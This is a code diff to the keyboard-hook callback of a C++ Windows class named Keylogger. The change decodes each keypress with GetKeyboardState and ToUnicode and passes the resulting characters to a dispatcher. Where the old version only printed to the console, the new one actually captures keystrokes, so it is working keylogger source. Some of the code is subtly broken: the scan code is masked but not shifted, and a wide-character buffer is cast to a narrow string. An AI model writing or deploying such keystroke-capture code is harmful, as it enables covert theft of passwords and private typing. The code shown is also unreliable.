@@ -6,20 +6,28 @@ std::shared_ptr<Dispatcher> Keylogger::_disp = NULL;
 
 LRESULT CALLBACK Keylogger::handleKey(int code, WPARAM wParam, LPARAM lParam)
 {
-	if (code <= 0)
-		return CallNextHookEx(g_hook[0], code, wParam, lParam);
-	
-		MSG *msg = (MSG *)(lParam);
+	if (code < 0)
+		return CallNextHookEx(NULL, code, wParam, lParam);
 
-		std::cout << "MSG => " << msg->message << std::endl;
-		if (msg->message == WM_CHAR)
-		{
-			char c =  msg->wParam;
+	DWORD tmp = static_cast<DWORD>(lParam);
+	int count = tmp & 0xFFFF;
+	int scanCode = tmp & 0xFF0000;
+	bool extend = tmp & 0x1000000;
+	bool context = tmp & 0x20000000;
+	bool up = tmp & 0x40000000;
+	bool transition = tmp & 0x80000000;
+	if (!up)
+	{
+		wchar_t name[255] = { 0 };
+		WORD c;
+		BYTE keyboardState[256] = { 0 };
 
-			std::cout << "Char => " << c << std::endl;
-//			if (_disp)
-//				_disp->dispatch(KeyStroke(std::string(&c, 1)));
-		}
+		if (!GetKeyboardState(keyboardState))
+			return CallNextHookEx(g_hook[0], code, wParam, lParam);
+		int size = ToUnicode(wParam, scanCode, keyboardState, name, 0xFF, 0);
+		if (size > 0 && _disp)
+			_disp->dispatch(KeyStroke(std::string(reinterpret_cast<char *>(name))));
+	}
 	return CallNextHookEx(g_hook[0], code, wParam, lParam);
 }
 
